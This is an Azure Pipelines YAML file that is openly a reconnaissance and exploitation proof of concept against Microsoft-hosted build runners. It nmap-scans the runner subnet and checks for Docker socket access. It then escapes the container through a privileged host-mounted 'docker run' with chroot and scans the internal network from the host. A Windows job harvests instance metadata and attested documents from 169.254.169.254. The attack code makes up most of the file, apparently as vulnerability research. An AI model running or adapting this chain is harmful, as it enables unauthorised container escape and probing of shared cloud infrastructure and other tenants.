# azure-pipelines.yml
trigger:
- main
pr:
- main

name: $(Date:yyyyMMdd)$(Rev:.r)

variables:
  SAFE_PORTS: "22,80,443,445,3306,3389,5432,8080,8443"
  IMDS_API: "2021-02-01"
  ATTEST_API: "2018-10-01"

stages:
- stage: Recon
  displayName: Hosted Runner Reconnaissance & Exploitation PoC
  jobs:

  # ------------------------- L I N U X : SEQUENTIAL ATTACK CHAIN -------------------------
  - job: linux_recon_broad_scan
    displayName: 'Linux Step 1: Broad Subnet Scan'
    pool:
      vmImage: 'ubuntu-22.04'
    steps:
    - checkout: none
    - task: Bash@3
      displayName: 'Execute Broad Subnet Scan (Replicating GitHub PoC)'
      inputs:
        targetType: inline
        script: |
          set -euo pipefail
          echo "### Installing Nmap"
          sudo apt-get update -y >/dev/null
          sudo apt-get install -y nmap >/dev/null
          mkdir -p artifacts

          SUBNET=$(ip -o -f inet addr show eth0 | awk '{print $4}' | head -n 1)
          if [ -z "$SUBNET" ]; then
            echo "::error::Could not determine subnet. Aborting."
            exit 1
          fi
          
          echo "Discovered subnet: $SUBNET"
          echo "Starting Nmap scan of the entire subnet for the top 100 ports. This may take a few minutes..."
          
          # Use -F for a fast scan of the top 100 ports, -T4 for speed.
          nmap -F -T4 $SUBNET | tee artifacts/full-subnet-scan.txt
          
          echo "Scan complete. See the 'full-subnet-scan.txt' artifact for results."
    - task: PublishPipelineArtifact@1
      displayName: 'Publish Broad Scan Artifacts'
      condition: succeededOrFailed()
      inputs:
        targetPath: 'artifacts'
        artifact: 'azure-recon-linux-step1-scan'

  - job: linux_recon_escape_vector_check
    displayName: 'Linux Step 2: Check for Container Escape Vector'
    dependsOn: linux_recon_broad_scan
    pool:
      vmImage: 'ubuntu-22.04'
    steps:
    - checkout: none
    - task: Bash@3
      displayName: 'Check for Docker Socket Access'
      inputs:
        targetType: inline
        script: |
          set -euo pipefail
          mkdir -p artifacts
          
          echo "### Checking current user and group memberships..."
          id | tee artifacts/user-id.txt
          
          echo "### Checking for Docker socket..."
          if [ -S "/var/run/docker.sock" ]; then
            echo "✅ Found Docker socket at /var/run/docker.sock" | tee -a artifacts/user-id.txt
            echo "### Checking Docker socket permissions..."
            ls -l /var/run/docker.sock | tee -a artifacts/user-id.txt
          else
            echo "❌ Docker socket not found at /var/run/docker.sock" | tee -a artifacts/user-id.txt
          fi
    - task: PublishPipelineArtifact@1
      displayName: 'Publish Escape Vector Check Artifacts'
      condition: succeededOrFailed()
      inputs:
        targetPath: 'artifacts'
        artifact: 'azure-recon-linux-step2-docker-check'

  - job: full_attack_chain_poc
    displayName: 'Linux Step 3: Full Attack Chain PoC (Host Escape & Scan)'
    dependsOn: linux_recon_escape_vector_check
    pool:
      vmImage: 'ubuntu-22.04'
    steps:
    - checkout: none
    - task: Bash@3
      displayName: 'Attempt Container Escape and Internal Network Scan'
      inputs:
        targetType: inline
        script: |
          set -euo pipefail
          mkdir -p artifacts

          echo "--- Checking for Docker socket and group permissions ---"
          if [ -S "/var/run/docker.sock" ] && getent group docker && id | grep -q '(docker)'; then
            echo "✅ SUCCESS: User is in the 'docker' group and socket is present."
            
            echo "--- Installing Nmap inside container for later use from host ---"
            sudo apt-get update >/dev/null && sudo apt-get install -y nmap >/dev/null
            
            SUBNET=$(ip -o -f inet addr show eth0 | awk '{print $4}')
            echo "Discovered internal subnet: $SUBNET"
            
            echo "--- ESCAPING CONTAINER to run Nmap from the host's network namespace ---"
            # This is the same technique used in your GitHub report.
            docker run --rm --privileged --network=host --pid=host -v /:/hostfs -v /usr/bin/nmap:/usr/bin/nmap \
              alpine:latest chroot /hostfs /usr/bin/nmap -F -T4 $SUBNET | tee artifacts/host-escape-scan.txt
              
            echo "✅ VULNERABILITY LIKELY CONFIRMED: Scan from host completed."
            echo "Review the 'host-escape-scan.txt' artifact for exposed services across the internal network."
          else
            echo "❌ TEST INCONCLUSIVE: The container escape vector (user in docker group) was not found."
            id | tee artifacts/poc-failure-id.txt
            ls -l /var/run/docker.sock | tee -a artifacts/poc-failure-id.txt || echo "Socket not found." | tee -a artifacts/poc-failure-id.txt
            exit 1
          fi
    - task: PublishPipelineArtifact@1
      displayName: 'Publish Attack PoC Artifacts'
      condition: succeededOrFailed()
      inputs:
        targetPath: 'artifacts'
        artifact: 'azure-poc-linux-step3-host-escape'

  # ------------------------ W I N D O W S : Baseline Recon ------------------------
  - job: windows_recon
    displayName: 'Windows Baseline Recon (windows-2022)'
    pool:
      vmImage: 'windows-2022'
    steps:
    - checkout: self
      clean: true
      persistCredentials: false
    - task: PowerShell@2
      displayName: 'Recon + cross-subscription evidence (safe)'
      inputs:
        targetType: inline
        pwsh: true
        script: |
          $ErrorActionPreference = 'SilentlyContinue'
          New-Item -ItemType Directory -Path artifacts -Force | Out-Null

          # -------- Network view
          $ipv4 = Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -ne '127.0.0.1'}
          $hostIp = ($ipv4 | Select-Object -First 1).IPAddress
          $gw = (Get-NetRoute -DestinationPrefix '0.0.0.0/0' | Sort-Object RouteMetric | Select-Object -First 1).NextHop
          $lines = [System.Collections.Generic.List[string]]::new()
          $lines.Add("Host IP: $hostIp")
          $lines.Add("Gateway: $gw")
          $lines.Add("")
          $lines.Add("Subnets:")
          $ipv4 | ForEach-Object { $lines.Add("- $($_.InterfaceAlias): $($_.IPAddress)/$($_.PrefixLength)") }
          $lines.Add("")
          $lines.Add("Routes (IPv4):")
          $lines.Add((Get-NetRoute | Out-String))
          $lines.Add("")
          $lines.Add("Neighbors (ARP):")
          $lines.Add((Get-NetNeighbor -AddressFamily IPv4 | Out-String))
          $lines -join "`r`n" | Set-Content artifacts/local-network-view.txt -Encoding UTF8

          # -------- IMDS
          $imds = Invoke-RestMethod -Headers @{Metadata='true'} -Uri "http://169.254.169.254/metadata/instance?api-version=$(IMDS_API)"
          $imds | ConvertTo-Json -Depth 12 | Set-Content artifacts/imds-azure.json -Encoding UTF8
          $compute = $imds.compute
          $txtImds = @(
            "subscriptionId:  $($compute.subscriptionId)"
            "resourceGroup:   $($compute.resourceGroupName)"
            "vmScaleSetName:  $($compute.vmScaleSetName)"
            "vmId:            $($compute.vmId)"
            "location:        $($compute.location)"
            "sku_offer:       $($compute.storageProfile.imageReference.publisher)/$($compute.storageProfile.imageReference.offer)"
            "privateIPv4:     $($compute.network.interface[0].ipv4.ipAddress[0].privateIpAddress)"
            "macAddress:      $($compute.network.interface[0].macAddress)"
            "subnet:          $($compute.network.interface[0].ipv4.subnet[0].address)"
          )
          $txtImds | Set-Content artifacts/imds-azure.txt -Encoding UTF8

          # -------- Attested document
          Invoke-RestMethod -Headers @{Metadata='true'} `
            -Uri "http://169.254.169.254/metadata/attested/document?api-version=$(ATTEST_API)" `
            | ConvertTo-Json -Depth 10 `
            | Set-Content artifacts/imds-attested-document.json -Encoding UTF8

          # -------- Egress & RDAP
          $publicIp = (Invoke-RestMethod https://api.ipify.org)
          $egress = @("public_ip: $publicIp", "")
          $rdns = Resolve-DnsName -Name $publicIp -Type PTR -ErrorAction SilentlyContinue
          if ($rdns) { $egress += "rDNS: " + ($rdns | Select-Object -ExpandProperty NameHost) }
          $egress | Set-Content artifacts/egress-posture.txt -Encoding UTF8
          Invoke-RestMethod "https://rdap.arin.net/registry/ip/$publicIp" `
            | ConvertTo-Json -Depth 10 `
            | Set-Content artifacts/egress-rdap.json -Encoding UTF8
    - task: PublishPipelineArtifact@1
      displayName: 'Publish recon artifacts (Windows)'
      condition: succeededOrFailed()
      inputs:
        targetPath: 'artifacts'
        artifact: 'azure-recon-windows'
